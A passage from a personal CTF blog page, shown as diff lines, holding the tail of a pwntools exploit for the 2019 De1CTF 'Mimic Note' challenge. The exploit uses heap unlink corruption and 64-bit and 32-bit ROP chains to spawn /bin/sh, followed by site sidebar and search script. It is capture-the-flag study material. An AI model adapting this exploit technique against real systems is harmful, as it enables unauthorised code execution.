bit unlink</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 0</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 1</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 2</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>) <span class="comment"># 3</span></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0xf0</span>) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x1f8</span>) <span class="comment"># 0 is 1</span></span><br><span class="line">    add(p, <span class="number">0xf8</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(<span class="number">0x6020b0</span><span class="number">-0x18</span>) + p64(<span class="number">0x6020b0</span><span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">'\x00'</span>) + p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 32 bit unlink</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>) <span class="comment"># 32 bit 5/6/7</span></span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line">    add(p, <span class="number">0x100</span><span class="number">-4</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0xf8</span> + p32(<span class="number">0x200</span>)</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x1f8</span>+<span class="number">4</span>) <span class="comment"># 5 is 6</span></span><br><span class="line">    add(p, <span class="number">0xf8</span>+<span class="number">4</span>)  <span class="comment"># 7</span></span><br><span class="line">    payload = p32(<span class="number">0</span>) + p32(<span class="number">0xf9</span>) + p32(<span class="number">0x804a090</span><span class="number">-0x18</span>/<span class="number">2</span>) + p32(<span class="number">0x804a090</span><span class="number">-0x10</span>/<span class="number">2</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf8</span>, <span class="string">'\x00'</span>) + p32(<span class="number">0xf8</span>)</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 64 idx 1 /// 32 idx 6</span></span><br><span class="line">    </span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x602050</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x602818</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x602200</span>) + p64(<span class="number">0x1000</span>)[:<span class="number">5</span>]</span><br><span class="line">    edit(p, <span class="number">1</span>, payload)   <span class="comment">#0x602058</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload = p32(<span class="number">0xf8</span>) + p32(<span class="number">0x804a060</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x804a060</span>) + p32(<span class="number">0x1000</span>)[:<span class="number">3</span>]</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line">    payload = p32(elf32.got[<span class="string">'atoi'</span>]) + p32(<span class="number">0x20</span>) + p32(<span class="number">0x804a200</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x804a7fc</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x0804a018</span>) + p32(<span class="number">4</span>)</span><br><span class="line">    edit(p, <span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">3</span>, p32(<span class="number">0x080489fb</span>)) <span class="comment"># test</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 64 bit ROP</span></span><br><span class="line">    <span class="comment"># call read to change write@got to syscall</span></span><br><span class="line">    ROP64 = p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">'read'</span>]) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">'write'</span>]) + p64(<span class="number">0</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x602700</span>) + p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">'read'</span>]) + p64(<span class="number">1</span>) + p64(<span class="number">0x602200</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">59</span>+<span class="number">0x30</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">'/bin/sh\x00'</span><span class="comment"># 0x602900 binsh</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set rax</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400B2B</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># call syscall</span></span><br><span class="line">    ROP64 += p64(<span class="number">0x400c2a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf64.got[<span class="string">'write'</span>]) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x602900</span>) + p64(<span class="number">0x400C10</span>)</span><br><span class="line">    ROP64 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x602700</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    </span><br><span class="line">    edit(p, <span class="number">1</span>, ROP64)</span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 64 bit ROP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 32 bit ROP</span></span><br><span class="line">    read_plt = <span class="number">0x8048460</span></span><br><span class="line">    write_got = <span class="number">0x804A02C</span></span><br><span class="line">    write_plt = <span class="number">0x80484D0</span></span><br><span class="line">    p_4reg_32 = <span class="number">0x080489f8</span></span><br><span class="line">    p_ebx_32 = <span class="number">0x08048439</span></span><br><span class="line">    bin_sh_addr = <span class="number">0x804a2e8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># call read to change write@got to syscall</span></span><br><span class="line">    ROP32 = p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a300</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set eax, edx</span></span><br><span class="line">    ROP32 += p32(<span class="number">0x080489f9</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xb</span>+<span class="number">0x2c</span>)</span><br><span class="line">    ROP32 += p32(<span class="number">0x8048907</span>)</span><br><span class="line">    ROP32 += p32(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line">    ROP32 += p32(<span class="number">0x8048588</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set ebx and call syscall</span></span><br><span class="line">    ROP32 += p32(p_ebx_32)+p32(bin_sh_addr)+p32(write_plt)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">2</span>, ROP32)</span><br><span class="line"></span><br><span class="line">    <span class="comment">############### 32 bit ROP</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger ROP</span></span><br><span class="line">    payload = p32(<span class="number">0x80489ee</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0x400c2f</span>)[:<span class="number">6</span>]</span><br><span class="line">    edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    payload = p32(<span class="number">0x602800</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804a800</span><span class="number">-8</span>) + p32(<span class="number">0x8048568</span>) + p64(<span class="number">0x400c2d</span>) + p64(<span class="number">0x602800</span>)[:<span class="number">6</span>]</span><br><span class="line">    p.sendafter(<span class="string">'&gt;&gt; '</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">##### first read to change write@got in 64bit</span></span><br><span class="line">    p.send(<span class="string">'\x7b'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##### second read to change write@got in 32bit</span></span><br><span class="line">    p.send(chr(count))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        pwn(<span class="number">108</span>) <span class="comment"># Bruteforce 32 bit libc</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/2019/" rel="tag"># 2019</a>
+          
+            <a href="/tags/de1ctf/" rel="tag"># de1ctf</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+            
+              <div id="needsharebutton-postbottom">
+                <span class="btn">
+                  <i class="fa fa-share-alt" aria-hidden="true"></i>
+                </span>
+              </div>
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/05/exe2lib-in-linux/" rel="next" title="【工具】将Linux下executable转为lib的探究">
+                <i class="fa fa-chevron-left"></i> 【工具】将Linux下executable转为lib的探究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/avatar/avatar.jpeg"
+                alt="sunichi"/>
+            
+              <p class="site-author-name" itemprop="name">sunichi</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">38</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">43</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unprintable"><span class="nav-number">1.</span> <span class="nav-text">unprintable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mimic-Note"><span class="nav-number">2.</span> <span class="nav-text">Mimic Note</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunichi</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+  <script>
+    
+      pbOptions = {};
+      
+        pbOptions.iconStyle = "default";
+      
+        pbOptions.boxForm = "horizontal";
+      
+        pbOptions.position = "bottomCenter";
+      
+        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
